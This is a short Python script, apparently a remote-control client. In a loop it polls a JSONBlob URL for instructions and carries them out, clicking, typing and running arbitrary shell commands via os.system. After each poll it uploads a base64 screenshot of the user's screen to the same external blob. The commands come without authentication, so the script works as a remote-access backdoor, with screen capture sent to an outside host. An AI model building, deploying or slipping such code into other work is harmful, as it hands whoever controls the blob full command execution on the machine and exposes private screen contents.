from config import JSONBLOB_URL
from PIL import Image
import pyautogui
import requests
import base64
import time
import io
import os


def main() -> None:
    while True:
        response = requests.get(JSONBLOB_URL)
        data = response.json()

        if data["command"] is not None:
            if data["command"]["type"] == "click":
                pyautogui.click(data["command"]["x"] * pyautogui.size()[0], data["command"]["y"] * pyautogui.size()[1])
                print("Click at", data["command"]["x"], data["command"]["y"])
            elif data["command"]["type"] == "write":
                pyautogui.write(data["command"]["text"])
                print("Write", data["command"]["text"])
            elif data["command"]["type"] == "run":
                os.system(data["command"]["command"])
                print("Run", data["command"]["command"])

            data["command"] = None

        data["screen"] = screenshot_to_data_url()
        requests.put(JSONBLOB_URL, json=data)
        print("JSONBLOB updated")
        time.sleep(4)


def screenshot_to_data_url(max_size: int = 360) -> str:
    screenshot = pyautogui.screenshot()
    width, height = screenshot.size

    if width > max_size or height > max_size:
        scale = min(max_size / width, max_size / height)
        new_width = int(width * scale)
        new_height = int(height * scale)
        screenshot = screenshot.resize((new_width, new_height), Image.Resampling.LANCZOS)

    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    buffer.seek(0)
    img_base64 = base64.b64encode(buffer.read()).decode("utf-8")
    return f"data:image/png;base64,{img_base64}"


if __name__ == "__main__":
    main()